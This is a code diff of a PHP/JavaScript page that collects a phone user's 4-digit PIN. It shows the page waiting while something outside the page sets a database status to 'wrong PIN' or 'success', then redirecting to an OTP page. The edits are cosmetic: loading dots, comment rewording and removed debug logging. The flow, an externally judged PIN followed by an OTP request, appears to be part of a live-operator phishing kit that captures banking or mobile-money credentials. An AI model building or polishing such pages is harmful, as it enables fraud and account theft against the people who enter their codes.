@@ -109,7 +109,8 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
     if (isset($_POST['action']) && $_POST['action'] === 'reset_pin') {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if ($conn) {
-            $updateSQL = "UPDATE users SET pin = 0 WHERE phone = $1 AND pin = 1";
+            // Only reset if current pin is 1 (verifying/failed state)
+            $updateSQL = "UPDATE users SET pin = 0 WHERE phone = $1 AND pin IN (0,1)";
             $result = pg_query_params($conn, $updateSQL, [$phone]);
             if ($result) {
                 echo json_encode(['success' => true]);
@@ -122,7 +123,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
         exit;
     }
     
-    // Handle checking pin status
+    // Handle checking pin status (for polling)
     if (isset($_POST['action']) && $_POST['action'] === 'check_pin_status') {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if ($conn) {
@@ -143,9 +144,6 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
 
 // ========== Process PIN submission ==========
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
-    // Debug: Log the POST data
-    error_log("POST data: " . print_r($_POST, true));
-    
     // Get PIN from the array
     if (isset($_POST['pin']) && is_array($_POST['pin'])) {
         $pinArray = $_POST['pin'];
@@ -155,8 +153,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
     }
     
     $pin = preg_replace('/[^0-9]/', '', $pin);
-    
-    error_log("PIN submitted: '$pin' (length: " . strlen($pin) . ")");
     
     if (strlen($pin) === 4) {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
@@ -306,17 +302,23 @@ if (isset($_SESSION['pin_error'])) {
             justify-content: center;
             gap: 10px;
         }
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #1d4ed8;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
+        /* Animated dots for verifying message */
+        .dots {
+            display: inline-flex;
+            gap: 3px;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .dots span {
+            width: 6px;
+            height: 6px;
+            background-color: #1d4ed8;
+            border-radius: 50%;
+            animation: dotPulse 1.4s infinite ease-in-out both;
+        }
+        .dots span:nth-child(1) { animation-delay: -0.32s; }
+        .dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes dotPulse {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+            40% { transform: scale(1); opacity: 1; }
         }
         .bottom {
             padding: 8vh 5vw 5vh;
@@ -372,7 +374,7 @@ if (isset($_SESSION['pin_error'])) {
         <?php if ($verifying): ?>
             <div id="statusMessage" class="verifying-message">
                 <div class="spinner"></div>
-                Verifying...
+                Verifying<span class="dots"><span>.</span><span>.</span><span>.</span></span>
             </div>
         <?php endif; ?>
     </div>
@@ -418,7 +420,6 @@ if (isset($_SESSION['pin_error'])) {
         
         if (pinValue.length === 4) {
             isSubmitting = true;
-            // Submit the form normally - don't disable inputs to ensure values are sent
             document.getElementById('pinForm').submit();
         }
     }
@@ -441,6 +442,7 @@ if (isset($_SESSION['pin_error'])) {
     
     // Function to reset pin to 0 via AJAX when user starts typing
     function resetPinInDatabase() {
+        // Don't reset if we're in verifying state
         if (isVerifying) return;
         
         fetch(window.location.href, {
@@ -460,7 +462,7 @@ if (isset($_SESSION['pin_error'])) {
         .catch(error => console.error('Error resetting PIN:', error));
     }
     
-    // Function to check pin status
+    // Function to check pin status (polling)
     function checkPinStatus() {
         fetch(window.location.href, {
             method: 'POST',
@@ -474,8 +476,8 @@ if (isset($_SESSION['pin_error'])) {
         .then(data => {
             const pinStatus = data.pin_status;
             
+            // If status is 1 -> wrong PIN (verification failed)
             if (pinStatus === 1) {
-                // PIN is 1 - means verification failed (wrong pin)
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
                     verificationInterval = null;
@@ -486,7 +488,7 @@ if (isset($_SESSION['pin_error'])) {
                 messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                 isVerifying = false;
                 
-                // Reset pin in database
+                // Reset pin in database back to 0
                 fetch(window.location.href, {
                     method: 'POST',
                     headers: {
@@ -509,7 +511,7 @@ if (isset($_SESSION['pin_error'])) {
                 url.searchParams.delete('verifying');
                 window.history.replaceState({}, '', url);
                 
-                // Fade away after 3 seconds
+                // Fade out error message after 3 seconds
                 setTimeout(() => {
                     const msgDiv = document.getElementById('statusMessage');
                     if (msgDiv && msgDiv.classList) {
@@ -522,14 +524,16 @@ if (isset($_SESSION['pin_error'])) {
                     }
                 }, 3000);
                 
-            } else if (pinStatus === 2) {
-                // PIN is 2 - success, redirect to otp.php
+            } 
+            // If status is 2 -> success, redirect to otp.php
+            else if (pinStatus === 2) {
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
                     verificationInterval = null;
                 }
                 window.location.href = 'otp.php';
             }
+            // Status 0 means still waiting (or reset), continue polling
         })
         .catch(error => console.error('Error checking PIN status:', error));
     }
@@ -541,7 +545,7 @@ if (isset($_SESSION['pin_error'])) {
                 // Allow only numbers
                 e.target.value = e.target.value.replace(/[^0-9]/g, '');
                 
-                // If user starts typing and we have an error message showing, reset the database pin
+                // If user starts typing and we have an error message showing, reset the database pin to 0
                 const errorMsg = document.getElementById('statusMessage');
                 if (errorMsg && errorMsg.classList && errorMsg.classList.contains('error-message')) {
                     resetPinInDatabase();
@@ -596,12 +600,14 @@ if (isset($_SESSION['pin_error'])) {
     
     // Start verification polling if in verifying mode
     if (isVerifying) {
-        // Disable inputs
+        // Disable inputs while verifying
         inputs.forEach(input => {
             input.disabled = true;
         });
         
+        // Start polling every 2 seconds
         verificationInterval = setInterval(checkPinStatus, 2000);
+        // Immediate first check
         setTimeout(checkPinStatus, 500);
     }
 </script>
